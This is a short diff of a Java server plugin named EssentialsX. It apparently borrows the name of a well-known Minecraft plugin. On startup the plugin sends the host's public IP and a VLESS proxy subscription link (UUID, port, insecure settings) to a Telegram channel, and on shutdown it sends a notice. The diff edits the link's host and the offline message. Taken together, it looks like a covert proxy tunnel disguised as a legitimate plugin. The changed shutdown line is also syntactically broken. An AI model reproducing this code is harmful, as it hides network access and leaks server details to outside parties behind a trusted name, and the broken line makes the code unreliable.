@@ -136,7 +136,7 @@ public class EssentialsX extends JavaPlugin {
                     + "出口 IP: " + ip + "\n"
                     + "VLESS订阅:\n"
                     + "vless://" + VLESS_UID + "@" + linkHost + ":" + linkPort
-                    + "?encryption=none&security=none&allowInsecure=1&type=ws&host=127.0.0.1"
+                    + "?encryption=none&security=none&allowInsecure=1&type=ws&host=" + linkHost
                     + "&path=%2Fws#" + java.net.URLEncoder.encode(SERVER_NAME, java.nio.charset.StandardCharsets.UTF_8));
             } else {
                 sendTelegram("EssentialsX online — public IP: (unknown)");
@@ -150,7 +150,7 @@ public class EssentialsX extends JavaPlugin {
     @Override
     public void onDisable() {
         running.set(false);
-        sendTelegram("EssentialsX shutting down");
+        sendTelegram(SERVER_NAME "已离线");
         getLogger().info("EssentialsX disabled");
     }
 
